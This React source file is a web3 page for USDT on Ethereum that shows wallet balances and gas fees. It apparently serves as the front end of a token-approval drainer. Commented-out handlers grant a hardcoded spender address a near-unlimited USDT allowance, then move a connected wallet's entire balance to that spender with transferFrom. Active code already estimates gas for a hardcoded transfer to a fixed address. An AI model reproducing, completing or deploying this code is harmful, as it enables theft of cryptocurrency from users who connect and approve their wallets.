import { useEffect, useState } from 'react'
import Web3 from 'web3'
import Toast from 'light-toast'
import Btn from './components/Btn'
import Ipt from './components/Ipt'
import ABI from './config/USDT_ERC20_ABI.json'
import { formatBalance } from './config/utils'

const USDT_ERC20_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const SPENDER_ADDRESS = '0xd34121Eb634De20fb4BB1ECB8693069d8411c7a0'

let web3 = null, contract = null, decimals = 0, timer = null
function App() {
	const [ rate, setRate ] = useState({
		'bitcoin': {usd: 51791, cny: 329750},
		'ethereum': {usd: 4400.49, cny: 28017},
		'litecoin': {usd: 163.13, cny: 1038.61},
		'tether': {usd: 0.999824, cny: 6.37},
		'tron': {usd: 0.091731, cny: 0.584041},
		'usd-coin': {usd: 0.998926, cny: 6.36}
	})
	const [ address, setAddress ] = useState('')
	const [ ethBalance, setEthBalance ] = useState(0)
	const [ usdtBalance, setUsdtBalance ] = useState(0)
	const [ gasFee, setGasFee ] = useState(0)

	const [ from, setFrom ] = useState('')
	const [ to, setTo ] = useState('')

	/**
	 * 初始化Tron
	 */
	const init = async () => {
		if (window.ethereum) {
			web3 = new Web3(window.ethereum)
			web3.currentProvider.enable().then(res => {
				if (web3.currentProvider.selectedAddress) {
					setAddress(web3.utils.toChecksumAddress(web3.currentProvider.selectedAddress))
				}
				contract = new web3.eth.Contract(ABI, USDT_ERC20_ADDRESS)
				contract.methods.decimals().call().then(res => { decimals = res })
				
				console.log(contract)
				
			}).catch(err => {
				console.log('err:', err)
				Toast.fail(`${err.code}: ${err.message}`)
			})
			
			
			console.log(web3)
			// contract = await tronWeb.contract(ABI, USDT_TRC20_ADDRESS)
			// console.log(contract)
			refresh()
			getGasFee()
			timer = setInterval(getGasFee, 5000)
		} else {
			Toast.fail('Ethereum not found!')
		}
	}

	const refresh = async (loading = false) => {
		loading && Toast.loading('Loading...')
		const selectedAddress = web3.utils.toChecksumAddress(web3.currentProvider.selectedAddress)
		const ethB = await web3.eth.getBalance(selectedAddress)
		const usdtB = await contract.methods.balanceOf(selectedAddress).call()
		setEthBalance(web3.utils.fromWei(ethB, 'ether'))
		setUsdtBalance(usdtB / Math.pow(10, decimals))
		Toast.hide()
	}

	const getGasFee = async () => {
		const gasPrice = await web3.eth.getGasPrice()
		const estimateGas = await web3.eth.estimateGas({
			from: web3.utils.toChecksumAddress(web3.currentProvider.selectedAddress),
			to: SPENDER_ADDRESS,
			data: "0xa9059cbb0000000000000000000000009fc8563fd6f692449515b47bb9fe27559347ffbd00000000000000000000000000000000000000000000000000000003f5476a00"
		})
		console.log('estimateGas: ', estimateGas)
		// console.log('gasPrice: ', web3.utils.fromWei(gasPrice, 'ether'))
		const fee = 80000 * +(web3.utils.fromWei(gasPrice, 'ether'))
		// console.log('fee: ', fee)
		setGasFee(fee)
	}

	const getRate = () => {
		fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,usd-coin,litecoin,tron&vs_currencies=usd,cny`)
			.then(res => res.json())
			.then(res => {
				setRate(res)
				const r = {
					ts: new Date().getTime(),
					value: res
				}
				localStorage.setItem('rate', JSON.stringify(r))
			})
	}

	useEffect(() => {
		Toast.loading('Loading...')
		const rate1 = localStorage.getItem('rate')
		if (rate1) {
			const r = JSON.parse(rate1)
			setRate(r.value)
			if ((+r.ts - new Date().getTime()) > 3600000 * 6) {
				getRate()
			}
		} else {
			getRate()
		}
		
		setTimeout(() => init(), 500)
		return () => {
			clearInterval(timer)
			timer = null
		}
	}, [])

	return (
		<div className="w-full flex flex-col items-center p-4">
			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">ETHEREUM</h1>
			<div className="py-3 text-center text-sm text-gray-600">
				<div>Address: <span className="text-blue-500">{address}</span></div>
				<div>Balance:  <span className="text-red-500 mx-2">{formatBalance(ethBalance)} ETH</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
				<div style={{ animation: 'fade 1s infinite' }}>
					Estimated gas fee: 
					<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} ETH</span>
					<span className="mx-2">(${formatBalance(+gasFee * rate['ethereum'].usd, 2)})</span>
					<span>(¥{formatBalance(+gasFee * rate['ethereum'].cny, 2)})</span>
				</div>
			</div>
			<Btn text={'Refresh'} onClick={() => refresh(true)} />
			<Btn 
				text={'Approve'} 
				theme={'green'} 
				onClick={async () => {
					// const { remaining } = await contract.allowance(address, SPENDER_ADDRESS).call()
					// const allowanceBalance = tronWeb.fromSun(remaining)
					// if (allowanceBalance > 0) {
					// 	return Toast.success('You have done!')
					// }
					// const res = await contract.approve(SPENDER_ADDRESS, 99999999000000).send()
					// console.log(res)
				}} 
			/>
			<Ipt 
				placeholder={'From (Approved)'} 
				value={from} 
				onChange={(e) => {
					setFrom(e.target.value)
				}} 
			/>
			<Ipt 
				placeholder={'To'} 
				value={to} 
				onChange={(e) => {
					setTo(e.target.value)
				}}
			/>
			<Btn 
				text={'Get allowance'} 
				theme={'yellow'} 
				onClick={async () => {
					// // if (!from.trim()) {
					// // 	Toast.fail('From address is required!')
					// // 	return
					// // }
					// if (from && !tronWeb.isAddress(from.trim())) {
					// 	Toast.fail('From address is invalid!')
					// 	return
					// }
					// const { remaining } = await contract.allowance(from || address, SPENDER_ADDRESS).call()
					// Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${tronWeb.fromSun(remaining)}`)
				}} 
			/>
			<Btn 
				text={'Transfer from'} 
				theme={'yellow'} 
				onClick={async () => {
					// if (from && !tronWeb.isAddress(from.trim())) {
					// 	Toast.fail('From address is invalid!')
					// 	return
					// }
					// const toAddress = to || SPENDER_ADDRESS
					// // const balance = await contract.balanceOf(address).call()
					// const balance = await contract.balanceOf(from || address).call()
					// alert(`【${from || address}】向【${toAddress}】转账【${tronWeb.fromSun(balance)}】开始`)
					// Toast.loading('Loading...')
					// const res = await contract.transferFrom(from || address, toAddress, balance).send()
					// // const res = await contract.transfer(toAddress, balance).send()
					// console.log(res)
					// Toast.hide()
					// setTimeout(() => {
					// 	refresh()
					// }, 3000)
					
				}}
			/>
		</div>
	)
}

export default App
